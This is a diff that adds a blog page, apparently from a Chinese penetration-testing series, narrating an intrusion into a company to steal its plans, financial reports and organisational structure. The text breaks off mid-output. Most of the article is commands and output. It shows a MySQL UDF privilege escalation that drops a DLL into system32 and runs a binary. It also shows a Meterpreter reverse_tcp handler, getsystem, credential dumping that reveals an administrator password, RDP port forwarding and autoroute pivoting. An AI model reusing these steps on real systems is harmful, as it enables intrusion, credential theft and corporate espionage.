+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Python 基础">Python 基础</span>
+            <span class="post-date" title="2018-03-17 17:34:28">2018/03/17</span>
+        </a>
+        
+        <a  class="Linux "
+           href="/article/linux-command.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Linux 基础命令">Linux 基础命令</span>
+            <span class="post-date" title="2018-03-15 22:17:28">2018/03/15</span>
+        </a>
+        
+        <a  class="Linux "
+           href="/article/linux-first.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Linux 基础知识">Linux 基础知识</span>
+            <span class="post-date" title="2018-03-11 14:41:35">2018/03/11</span>
+        </a>
+        
+        <a  class="网络基础 "
+           href="/article/network-what-socket.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="什么是socket">什么是socket</span>
+            <span class="post-date" title="2018-03-11 12:00:35">2018/03/11</span>
+        </a>
+        
+        <a  class="网络基础 "
+           href="/article/network-mask-calculation.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="子网掩码的计算">子网掩码的计算</span>
+            <span class="post-date" title="2018-03-10 16:14:35">2018/03/10</span>
+        </a>
+        
+        <a  class="网络基础 "
+           href="/article/network-osi-model.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="OSI七层模型详解">OSI七层模型详解</span>
+            <span class="post-date" title="2018-03-10 01:14:35">2018/03/10</span>
+        </a>
+        
+        <a  class="网络基础 "
+           href="/article/network-the-code.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="原码补码反码">原码补码反码</span>
+            <span class="post-date" title="2018-03-10 00:04:58">2018/03/10</span>
+        </a>
+        
+        <a  class="网络基础 "
+           href="/article/network-hex-convert.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="进制之间的转换">进制之间的转换</span>
+            <span class="post-date" title="2018-03-09 20:34:28">2018/03/09</span>
+        </a>
+        
+        <a  class="Windows "
+           href="/article/windows-ubuntu-metasploit.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Windows10 Ubuntu子系统下安装Metasploit">Windows10 Ubuntu子系统下安装Metasploit</span>
+            <span class="post-date" title="2018-02-18 22:04:56">2018/02/18</span>
+        </a>
+        
+        <a  class="Windows "
+           href="/article/windows-install-ubuntu.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Windows10 Ubuntu子系统初始配置">Windows10 Ubuntu子系统初始配置</span>
+            <span class="post-date" title="2018-02-17 13:21:23">2018/02/17</span>
+        </a>
+        
+        <a  class="Windows "
+           href="/article/windows-ubuntu-opencv.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Windows10 Ubuntu子系统配置OpenCV图像处理">Windows10 Ubuntu子系统配置OpenCV图像处理</span>
+            <span class="post-date" title="2018-02-10 15:45:23">2018/02/10</span>
+        </a>
+        
+        <a  class="Windows "
+           href="/article/windows-linux-ssh.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Windows10 Ubuntu子系统配置SSH服务">Windows10 Ubuntu子系统配置SSH服务</span>
+            <span class="post-date" title="2018-02-09 16:04:10">2018/02/09</span>
+        </a>
+        
+        <a  class="Windows "
+           href="/article/windows-ubuntu-mysql.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Windows10 Ubuntu子系统下安装MySQL">Windows10 Ubuntu子系统下安装MySQL</span>
+            <span class="post-date" title="2018-01-28 11:40:01">2018/01/28</span>
+        </a>
+        
+        <a  class="回收站 "
+           href="/article/refuse-site-survival.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Python 批量检测网站存活（多线程）">Python 批量检测网站存活（多线程）</span>
+            <span class="post-date" title="2017-10-29 15:47:00">2017/10/29</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-8_模拟诉求任务攻击" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">8、模拟诉求任务攻击</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a href="javascript:" data-rel="Micro8">Micro8</a>
+            
+        </span>
+        
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2019-09-29 20:11:11'>2019-09-21 19:03</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:2.2k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#模拟诉求任务攻击"><span class="toc-text">模拟诉求任务攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#模拟任务："><span class="toc-text">模拟任务：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、主站-Shell"><span class="toc-text">1、主站 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、信息搜集"><span class="toc-text">2、信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、第二台服务器权限"><span class="toc-text">3、第二台服务器权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、msf-操作实例"><span class="toc-text">4、msf 操作实例</span></a></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-6 i,
+    .toc-level-6 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="模拟诉求任务攻击"><a href="#模拟诉求任务攻击" class="headerlink" title="模拟诉求任务攻击"></a>模拟诉求任务攻击</h1><h2 id="模拟任务："><a href="#模拟任务：" class="headerlink" title="模拟任务："></a>模拟任务：</h2><p>拿到该公司明年计划，拿到该公司今年报表，并且摸清该公司组织架构。盈利情况。</p>
+<h3 id="1、主站-Shell"><a href="#1、主站-Shell" class="headerlink" title="1、主站 Shell"></a>1、主站 Shell</h3><p>第一个shell为目标主站shell，为08 R2，提权后遂改变主意。由于是以APT为主，并不打算以主站权限为点渗透，动作太大。不利于长期跟踪。改变为搜集情报为主。配合下一步工作。  </p>
+<p><img src="../do/media/746b8e7d82cbc4a1fdfac3456a8858c6.jpg" alt>  </p>
+<p>主站为2008 R2:  </p>
+<p><img src="../do/media/e15310a75e294cf4f5c16229a247812c.jpg" alt>  </p>
+<p>主站端口为:  </p>
+<p><img src="../do/media/f6268dd0a332a740852ed3c09b3c5bfa.jpg" alt></p>
+<h3 id="2、信息搜集"><a href="#2、信息搜集" class="headerlink" title="2、信息搜集"></a>2、信息搜集</h3><p>搜集端口为该公司的其他分站提供下一步探测。</p>
+<ul>
+<li>进程搜集：红色为重点搜集源</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&gt;   D:\&gt; tasklist</span><br><span class="line"></span><br><span class="line">映像名稱 PID 工作階段名稱 工作階段 # RAM使用量</span><br><span class="line"></span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">System Idle Process 0 0 24 K</span><br><span class="line">System 4 0 372 K</span><br><span class="line">smss.exe 296 0 1,448 K</span><br><span class="line">csrss.exe 400 0 6,968 K</span><br><span class="line">wininit.exe 452 0 5,636 K</span><br><span class="line">csrss.exe 460 1 12,460 K</span><br><span class="line">winlogon.exe 496 1 6,484 K</span><br><span class="line">services.exe 556 0 10,392 K</span><br><span class="line">lsass.exe 572 0 22,076 K</span><br><span class="line">lsm.exe 584 0 7,104 K</span><br><span class="line">svchost.exe 676 0 10,840 K</span><br><span class="line">svchost.exe 760 0 9,492 K</span><br><span class="line">LogonUI.exe 852 1 19,632 K</span><br><span class="line">svchost.exe 864 0 21,188 K</span><br><span class="line">svchost.exe 904 0 34,904 K</span><br><span class="line">svchost.exe 944 0 13,476 K</span><br><span class="line">svchost.exe 996 0 13,512 K</span><br><span class="line">svchost.exe 168 0 19,480 K</span><br><span class="line">svchost.exe 648 0 12,348 K</span><br><span class="line">spoolsv.exe 1080 0 16,672 K</span><br><span class="line">armsvc.exe 1124 0 4,208 K</span><br><span class="line">apnmcp.exe 1172 0 5,832 K</span><br><span class="line">svchost.exe 1196 0 9,228 K</span><br><span class="line">aspnet_state.exe 1224 0 8,264 K</span><br><span class="line">FileZilla Server.exe 1344 0 7,876 K</span><br><span class="line">svchost.exe 1380 0 10,408 K</span><br><span class="line">inetinfo.exe 1412 0 31,680 K</span><br><span class="line">EngineServer.exe 1448 0 568 K</span><br><span class="line">FrameworkService.exe 1548 0 19,580 K</span><br><span class="line">VsTskMgr.exe 1612 0 1,724 K</span><br><span class="line">MDM.EXE 1680 0 6,652 K</span><br><span class="line">naPrdMgr.exe 1692 0 2,116 K</span><br><span class="line">mfevtps.exe 1720 0 992 K</span><br><span class="line">sqlservr.exe 1760 0 13,284 K</span><br><span class="line">svchost.exe 1844 0 3,452 K</span><br><span class="line">snmp.exe 1868 0 9,264 K</span><br><span class="line">sqlwriter.exe 1904 0 7,440 K</span><br><span class="line">vmtoolsd.exe 1976 0 17,012 K</span><br><span class="line">snmp.exe 1988 0 3,164 K</span><br><span class="line">conhost.exe 1996 0 4,784 K</span><br><span class="line">vmware-converter-a.exe 2068 0 31,460 K</span><br><span class="line">vmware-converter.exe 2180 0 38,176 K</span><br><span class="line">vmware-converter.exe 2228 0 32,828 K</span><br><span class="line">svchost.exe 2288 0 14,152 K</span><br><span class="line">McShield.exe 2320 0 89,332 K</span><br><span class="line">mfeann.exe 2468 0 5,860 K</span><br><span class="line">conhost.exe 2476 0 3,380 K</span><br><span class="line">w3wp.exe 2592 0 160,760 K</span><br><span class="line">w3wp.exe 2812 0 463,872 K</span><br><span class="line">svchost.exe 3452 0 9,656 K</span><br><span class="line">svchost.exe 4104 0 6,384 K</span><br><span class="line">dllhost.exe 4252 0 12,192 K</span><br><span class="line">msdtc.exe 4424 0 8,708 K</span><br><span class="line">svchost.exe 4196 0 34,760 K</span><br><span class="line">w3wp.exe 5604 0 12,632 K</span><br><span class="line">TrustedInstaller.exe 4500 0 11,788 K</span><br><span class="line">cmd.exe 6292 0 3,932 K</span><br><span class="line">conhost.exe 6384 0 4,476 K</span><br><span class="line">tasklist.exe 1496 0 6,064 K</span><br><span class="line">WmiPrvSE.exe 5508 0 7,272 K</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>账户搜集：（已处理）<br><img src="../do/media/717681fc6cc9bf99ce2e08d1269bf520.jpg" alt></p>
+</li>
+<li><p>重要路径搜集：<br>（无图，路径搜集为未来可能需要dump file做准备）</p>
+</li>
+<li><p>数据库密码搜集：<br>（无图，密码搜集为未来可能需要碰撞做准备）</p>
+</li>
+<li><p>杀毒软件搜集： 强力的麦咖啡</p>
+</li>
+<li><p>管理员习惯搜集：<br>（无图，尽量避免与admin的fvsf）（面对面的vs是不是这么拼写？）</p>
+</li>
+<li><p>其他搜集：<br>（由于是第一个shell，具体的已经忘记了）</p>
+</li>
+</ul>
+<h3 id="3、第二台服务器权限"><a href="#3、第二台服务器权限" class="headerlink" title="3、第二台服务器权限"></a>3、第二台服务器权限</h3><p>第二台服务器权限：window x86 2003  </p>
+<p>根据上一台的服务器情报搜集很快得到了一台win03<br><img src="../do/media/e9c1ae09ef37846c5585efce53581daa.jpg" alt><br><img src="../do/media/925237f336d2f19420dbded16fb9fc93.jpg" alt>  </p>
+<ul>
+<li>IP .3<br><img src="../do/media/ded2f1377655e8467db234c432e8a51f.jpg" alt></li>
+</ul>
+<p>为一台开发机。目标仅支持 asp，无其他脚本支持。但是服务器中安装有 mysql，php 等。并且无 asp to mysql Device Drive IIS 配置中也并不支持 php。msf 反弹后，继续搜集情报。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\MySQL\MySQL Server 5.0\data\mysql\user.MYD</span><br></pre></td></tr></table></figure>
+
+<p>得到 root hash</p>
+<p>在实际情况中，交互的shell下运行 <code>mysql -uroot -pxxx</code> 无法继续交互，需要参数 e 解决这个问题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;create table a (cmd LONGBLOB);&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;insert into a (cmd) values (hex(load_file(&apos;C:\\xxxx\\xxxx.dll&apos;)));&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;SELECT unhex(cmd) FROM a INTO DUMPFILE</span><br><span class="line"> &apos;c:\\windows\\system32\\xxxx.dll&apos;;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;CREATE FUNCTION shell RETURNS STRING SONAME &apos;udf.dll&apos;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;select shell(&apos;cmd&apos;,&apos;C:\\xxxx\\xxx\\xxxxx.exe&apos;);&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../do/media/0778524b132d34c4e9ac2bdeb4f5ff26.jpg" alt></p>
+<p><strong>如果限制上传大小同样可以hex解决上传大小问题。</strong></p>
+<h3 id="4、msf-操作实例"><a href="#4、msf-操作实例" class="headerlink" title="4、msf 操作实例"></a>4、msf 操作实例</h3><p>以下为部分msf操作实例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; exploit -l</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">PID PPID Name Arch Session User Path</span><br><span class="line">--- ---- ---- ---- ------- ---- ----</span><br><span class="line"></span><br><span class="line">0 0 [System Process]</span><br><span class="line">4 0 System x86 0 NT AUTHORITY\SYSTEM</span><br><span class="line">304 4 smss.exe x86 0 NT AUTHORITY\SYSTEM\SystemRoot\System32\smss.exe</span><br><span class="line">352 304 csrss.exe x86 0 NT AUTHORITY\SYSTEM \?? \C:\WINDOWS\system32\csrss.exe</span><br><span class="line">376 304 winlogon.exe x86 0 NT AUTHORITY\SYSTEM \?? \C:\WINDOWS\system32\winlogon.exe</span><br><span class="line">424 376 services.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\services.exe</span><br><span class="line">436 376 lsass.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\lsass.exe</span><br><span class="line">620 424 vmacthlp.exe x86 0 NT AUTHORITY\SYSTEM C:\Program Files\VMware\VMware Tools\vmacthlp.exe</span><br><span class="line">636 424 svchost.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\svchost.exe</span><br><span class="line">708 424 svchost.exe x86 0 NT AUTHORITY\NETWORK SERVICE C:\WINDOWS\system32\svchost.exe</span><br><span class="line">768 424 svchost.exe x86 0 NT AUTHORITY\NETWORK SERVICE C:\WINDOWS\system32\svchost.exe</span><br><span class="line">812 424 svchost.exe x86 0 NT AUTHORITY\LOCAL SERVICE C:\WINDOWS\system32\svchost.exe</span><br><span class="line">828 424 svchost.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\System32\svchost.exe</span><br><span class="line">1000 424 spoolsv.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\spoolsv.exe</span><br><span class="line">1028 424 msdtc.exe x86 0 NT AUTHORITY\NETWORK SERVICE C:\WINDOWS\system32\msdtc.exe</span><br><span class="line">1160 424 svchost.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\System32\svchost.exe</span><br><span class="line">1228 424 inetinfo.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\inetsrv\inetinfo.exe</span><br><span class="line">1252 424 sqlservr.exe x86 0 NT AUTHORITY\SYSTEM C:\PROGRA\~1\MICROS~1\MSSQL\binn\sqlservr.exe</span><br><span class="line">1304 424 mysqld.exe x86 0 NT AUTHORITY\SYSTEM C:\Program Files\MySQL\MySQL Server 5.1\bin\mysqld.exe</span><br><span class="line">1348 424 svchost.exe x86 0 NT AUTHORITY\LOCAL SERVICE C:\WINDOWS\system32\svchost.exe</span><br><span class="line">1408 424 vmtoolsd.exe x86 0 NT AUTHORITY\SYSTEM C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</span><br><span class="line">1472 424 mssearch.exe x86 0 NT AUTHORITY\SYSTEM C:\Program Files\Common Files\System\MSSearch\Bin\mssearch.exe</span><br><span class="line">1720 424 svchost.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\System32\svchost.exe</span><br><span class="line">2128 2084 explorer.exe x86 0 xxxxxxxxxxxx\Administrator C:\WINDOWS\Explorer.EXE</span><br><span class="line">2208 2128 vmtoolsd.exe x86 0 xxxxxxxxxxxx\Administrator C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</span><br><span class="line">2232 2128 ctfmon.exe x86 0 xxxxxxxxxxxx\Administrator C:\WINDOWS\system32\ctfmon.exe</span><br><span class="line">2244 2128 sqlmangr.exe x86 0 xxxxxxxxxxxx\Administrator C:\Program Files\Microsoft SQL Server\80\Tools\Binn\sqlmangr.exe</span><br><span class="line">2396 424 svchost.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\System32\svchost.exe</span><br><span class="line">2440 424 dllhost.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\dllhost.exe</span><br><span class="line">3008 2128 cmd.exe x86 0 xxxxxxxxxxxx\Administrator C:\WINDOWS\system32\cmd.exe</span><br><span class="line">3024 3008 conime.exe x86 0 xxxxxxxxxxxx\Administrator C:\WINDOWS\system32\conime.exe</span><br><span class="line">3180 636 wmiprvse.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\wbem\wmiprvse.exe</span><br><span class="line">3248 828 wuauclt.exe xxxxxxxxxxxx\Administrator C:\WINDOWS\system32\wuauclt.exe</span><br><span class="line">3380 376 logon.scr x86 0 xxxxxxxxxxxx\Administrator C:\WINDOWS\System32\logon.scr</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; migrate 2128</span><br><span class="line">[*] Migrating from 3104 to 2128...</span><br><span class="line">[*] Migration completed successfully. meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM meterpreter &gt; msv</span><br><span class="line"></span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving msv credentials msv credentials</span><br><span class="line"></span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">AuthID Package Domain User Password</span><br><span class="line">------ ------- ------ ---- --------</span><br><span class="line"></span><br><span class="line">0;109205 NTLM xxxxxxxxxxxx Administrator lm&#123; xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;, ntlm&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx &#125;</span><br><span class="line">0;996 Negotiate NT AUTHORITY NETWORK SERVICE lm&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx &#125;, ntlm&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx &#125;</span><br><span class="line">0;997 Negotiate NT AUTHORITY LOCAL SERVICE n.s. (Credentials KO)</span><br><span class="line">0;54469 NTLM n.s. (Credentials KO)</span><br><span class="line">0;999 NTLM WORKGROUP xxxxxxxxxxxx\$ n.s. (Credentials KO)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; kerberos [+] Running as SYSTEM</span><br><span class="line"></span><br><span class="line">[*] Retrieving kerberos credentials kerberos credentials</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">AuthID Package Domain User Password</span><br><span class="line">------ ------- ------ ---- --------</span><br><span class="line"></span><br><span class="line">0;996 Negotiate NT AUTHORITY NETWORK SERVICE</span><br><span class="line">0;997 Negotiate NT AUTHORITY LOCAL SERVICE</span><br><span class="line">0;54469 NTLM</span><br><span class="line">0;999 NTLM WORKGROUP xxxxxxxxxxxx$</span><br><span class="line">0;109205 NTLM xxxxxxxxxxxx Administrator 123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; portfwd add -l 3389 -r x.x.x.x -p 3389 #IP已做处理</span><br><span class="line">[*] Local TCP relay created: :3389 &lt;-&gt; x.x.x.x:3389</span><br><span class="line">meterpreter &gt; portfwd</span><br><span class="line"></span><br><span class="line">Active Port Forwards</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line">Index Local Remote Direction</span><br><span class="line">----- ----- ------ ---------</span><br><span class="line">1 0.0.0.0:3389 x.x.x.x:3389 Forward</span><br><span class="line">1 total active port forwards.</span><br><span class="line"></span><br><span class="line">root@xxxx:/# rdesktop 127.0.0.1:3389 Autoselected keyboard map en-us</span><br><span class="line">Failed to negotiate protocol, retrying with plain RDP.</span><br><span class="line">WARNING: Remote desktop does not support colour depth 24; falling back to 16</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line"></span><br><span class="line">[*] Usage: run autoroute [-r] -s subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*] run autoroute -s 10.1.1.0 -n 255.255.255.0 # Add a route to</span><br><span class="line">10.10.10.1/255.255.255.0</span><br><span class="line">[*] run autoroute -s 10.10.10.1 # Netmask defaults to 255.255.255.0</span><br><span class="line">[*] run autoroute -s 10.10.10.1/24 # CIDR notation is also okay</span><br><span class="line">[*] run autoroute -p # Print active routing table</span><br><span class="line">[*] run autoroute -d -s 10.10.10.1 # Deletes the 10.10.10.1/255.255.255.0 route</span><br><span class="line">[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes</span><br><span class="line">[-] Deprecation warning: This script has been replaced by the post/windows/manage/autoroute module</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ifconfig</span><br><span class="line"></span><br><span class="line">Interface 1</span><br><span class="line"></span><br><span class="line">============</span><br><span class="line">Name : MS TCP Loopback interface</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU : 1520</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line"></span><br><span class="line">Interface 2</span><br><span class="line"></span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">Name : Broadcom NetXtreme Gigabit Ethernet - McAfee NDIS Intermediate Filter Miniport</span><br><span class="line">Hardware MAC : 00:11:25:40:77:8f</span><br><span class="line">MTU : 1500</span><br><span class="line">IPv4 Address : 10.23.255.3 IPv4 Netmask : 255.255.255.0</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -s 10.23.255.3 -n 255.255.255.0</span><br><span class="line"></span><br><span class="line">[*] Adding a route to 10.23.255.3/255.255.255.0...</span><br><span class="line">[+] Added route to 10.23.255.3/255.255.255.0 via 61.57.243.227</span><br><span class="line">[*] Use the -p option to list all active routes</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Subnet Netmask Gateway</span><br><span class="line">------ ------- -------</span><br><span class="line">10.23.255.3 255.255.255.0 Session 3</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ifconfig</span><br><span class="line"></span><br><span class="line">Interface 1</span><br><span class="line"></span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">Name : MS TCP Loopback interface</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU : 1520</span><br><span class="line">IPv4 Address : 